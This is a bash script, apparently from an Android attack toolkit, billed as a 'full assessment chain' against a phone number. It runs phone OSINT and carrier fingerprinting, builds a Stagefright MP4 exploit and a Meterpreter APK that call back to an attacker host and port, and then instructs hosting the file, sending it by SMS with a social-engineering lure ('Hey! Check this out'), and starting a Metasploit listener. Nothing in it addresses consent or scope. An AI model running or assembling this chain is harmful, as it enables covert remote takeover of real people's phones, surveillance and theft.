#!/bin/bash
# full_assessment.sh — One-shot Android assessment chain
# Usage: ./full_assessment.sh <TARGET_NUMBER> <LHOST> <LPORT>

set -e

TARGET="${1}"
LHOST="${2}"
LPORT="${3:-4444}"

if [ -z "$TARGET" ] || [ -z "$LHOST" ]; then
    echo "Usage: $0 <TARGET_NUMBER> <LHOST> [LPORT]"
    echo "Example: $0 +15096149539 192.168.1.100 4444"
    exit 1
fi

echo "═══════════════════════════════════════════════"
echo "   Android Assessment Toolkit — Full Chain"
echo "   Target: $TARGET"
echo "   LHOST:  $LHOST"
echo "   LPORT:  $LPORT"
echo "═══════════════════════════════════════════════"
echo ""

# Step 1: OSINT Recon
echo "╔══════════════════════════════════════════════╗"
echo "║  Step 1: Phone OSINT Recon                  ║"
echo "╚══════════════════════════════════════════════╝"
python3 phone_osint.py "$TARGET"
echo ""

# Step 2: Carrier Fingerprinting
echo "╔══════════════════════════════════════════════╗"
echo "║  Step 2: Carrier Fingerprinting             ║"
echo "╚══════════════════════════════════════════════╝"
python3 carrier_fingerprint.py "$TARGET"
echo ""

# Step 3: Generate Stagefright MP4
echo "╔══════════════════════════════════════════════╗"
echo "║  Step 3: Generate Stagefright MP4 Exploit   ║"
echo "╚══════════════════════════════════════════════╝"
python3 stagefright_mp4.py --lhost "$LHOST" --lport "$LPORT" -o exploit.mp4
echo ""

# Step 4: Generate Payload APK
echo "╔══════════════════════════════════════════════╗"
echo "║  Step 4: Generate Meterpreter APK Payload   ║"
echo "╚══════════════════════════════════════════════╝"
./gen_payload.sh "$LHOST" "$LPORT"
echo ""

echo "╔══════════════════════════════════════════════╗"
echo "║  NEXT STEPS                                  ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "[*] 1. Host exploit.mp4 at a public URL"
echo "     Example: scp exploit.mp4 user@vps:/var/www/html/"
echo ""
echo "[*] 2. Send via SMS/MMS:"
echo "     python3 sms_delivery.py $TARGET \\"
echo "       --media https://your-vps.com/exploit.mp4 \\"
echo "       --message \"Hey! Check this out 😄\""
echo ""
echo "[*] 3. Start Metasploit handler (in another terminal):"
echo "     ./start_listener.sh $LHOST $LPORT"
echo ""
echo "═══════════════════════════════════════════════"
echo "   Assessment preparation complete."
echo "   Target: $TARGET"
echo "═══════════════════════════════════════════════"
